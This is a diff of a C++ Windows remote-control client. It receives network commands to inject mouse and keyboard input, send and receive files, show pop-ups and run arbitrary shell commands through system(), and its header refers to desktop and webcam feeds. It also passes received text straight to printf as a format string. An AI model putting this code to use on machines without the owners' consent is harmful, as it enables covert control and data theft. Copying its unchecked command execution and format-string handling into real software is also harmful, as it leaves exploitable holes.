@@ -9,6 +9,18 @@
 
 using namespace std;
 
+std::wstring s2ws(const std::string& s)
+{
+    int len;
+    int slength = (int)s.length() + 1;
+    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
+    wchar_t* buf = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
+    std::wstring r(buf);
+    delete[] buf;
+    return r;
+}
+
 NetworkHandlerServer NH;
 string DesktopFeed = "Desktop Feed";
 string CamFeed = "Cam Feed";
@@ -62,21 +74,17 @@ cv::Mat hwnd2mat(HWND hwnd) {
     return src;
 }
 
-void rcv(NetworkHandlerServer NH) {
+void rcv() {
     DataType dt;
     cv::Mat image;
     INPUT in;
 
-
-
-    NH.RecvTypeList();
-
     while (true) {
-        NH.RecvDataType(dt);
+        NH.RecvDataType(&dt);
         if (dt.Name == "MousePos") {
             in.type = INPUT_MOUSE;
-            in.mi.dx = NH.RecvDataT<long>();
-            in.mi.dy = NH.RecvDataT<long>();
+            NH.RecvDataT<long>(&in.mi.dx);
+            NH.RecvDataT<long>(&in.mi.dy);
             in.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
             in.mi.mouseData = 0;
             in.mi.dwExtraInfo = 0;
@@ -98,7 +106,8 @@ void rcv(NetworkHandlerServer NH) {
 
         }
         else if (dt.Name == "MouseDown") {
-            int clickType = NH.RecvDataT<int>();
+            int clickType;
+            NH.RecvDataT<int>(&clickType);
             if (clickType == 1) {
                 in.type = INPUT_MOUSE;
                 in.mi.dx = 0;
@@ -172,7 +181,8 @@ void rcv(NetworkHandlerServer NH) {
 
         }
         else if (dt.Name == "MouseUp") {
-            int clickType = NH.RecvDataT<int>();
+            int clickType;
+            NH.RecvDataT<int>(&clickType);
             if (clickType == 1) {
                 in.type = INPUT_MOUSE;
                 in.mi.dx = 0;
@@ -251,7 +261,7 @@ void rcv(NetworkHandlerServer NH) {
             in.ki.dwExtraInfo = 0;
 
             // Press the "A" key
-            in.ki.wVk = NH.RecvDataT<WORD>();; // virtual-key code for the "a" key
+            NH.RecvDataT<WORD>(&in.ki.wVk);; // virtual-key code for the "a" key
             in.ki.dwFlags = 0; // 0 for key press
             SendInput(1, &in, sizeof(INPUT));
 
@@ -264,20 +274,23 @@ void rcv(NetworkHandlerServer NH) {
             in.ki.dwExtraInfo = 0;
 
             // Press the "A" key
-            in.ki.wVk = NH.RecvDataT<WORD>();; // virtual-key code for the "a" key
+            NH.RecvDataT<WORD>(&in.ki.wVk);; // virtual-key code for the "a" key
             in.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
             SendInput(1, &in, sizeof(INPUT));
         }
         else if (dt.Name == "SendFILE") {
-            std::string path = NH.RecvDataT<std::string>();
+            std::string path;
+            NH.RecvDataT<std::string>(&path);
             NH.RecvFile(path);
         }
         else if (dt.Name == "RecvFILE") {
-            std::string path = NH.RecvDataT<std::string>();
+            std::string path;
+            NH.RecvDataT<std::string>(&path);
             NH.SendFile(path, 10000);
         }
         else if (dt.Name == "CMD") {
-            string command = NH.RecvDataT<std::string>();
+            string command;
+            NH.RecvDataT<std::string>(&command);
             system(command.c_str());
         }
         else if (dt.Name == "DataTypeList") {
@@ -293,21 +306,25 @@ void rcv(NetworkHandlerServer NH) {
         }
         else if (dt.Name == "RecvPopUp") {
 
-            string Title = NH.RecvDataT<string>();
+            wstring Title;
+            NH.RecvDataT<wstring>(&Title);
 
-            string Msg = NH.RecvDataT<string>();
+            wstring Msg;
+            NH.RecvDataT<wstring>(&Msg);
 
             MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONEXCLAMATION);
 
         }
         else if (dt.Name == "RecvPopUpYN") {
-            string Title = NH.RecvDataT<string>();
+            wstring Title;
+            NH.RecvDataT<wstring>(&Title);
 
-            string Msg = NH.RecvDataT<string>();
+            wstring Msg;
+            NH.RecvDataT<wstring>(&Msg);
 
-            int awnser = MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONQUESTION | MB_YESNO);
+            int answer = MessageBox(NULL, (LPWSTR)Msg.c_str(), (LPWSTR)Title.c_str(), MB_ICONQUESTION | MB_YESNO);
 
-            switch (awnser)
+            switch (answer)
             {
             case IDYES:
                 NH.SendDataT<int>(1);
@@ -317,6 +334,18 @@ void rcv(NetworkHandlerServer NH) {
                 break;
             }
         }
+        else if (dt.Name == "ConsoleMessage") {
+            string s;
+            NH.RecvDataT<string>(&s);
+            printf(s.c_str());
+            printf("\n");
+        }
+        else if (dt.Name == "DataTypeList") {
+        NH.RecvTypeList();
+        }
+        else {
+            //printf("Invalid Packet Recvied\n");
+        }
 
     }
 }
@@ -325,14 +354,18 @@ void rcv(NetworkHandlerServer NH) {
 int main()
 {
 
-    thread recvThread;
+    //thread recvThread;
 
 
     if (NH.DefaultInitConnect()) {
-        recvThread = thread(rcv, NH);
+        rcv();
+        //recvThread = thread(rcv);
         //system("pause");
     }
 
-    recvThread.join();
+    //recvThread.join();
+
+
+
     return 0;
 }
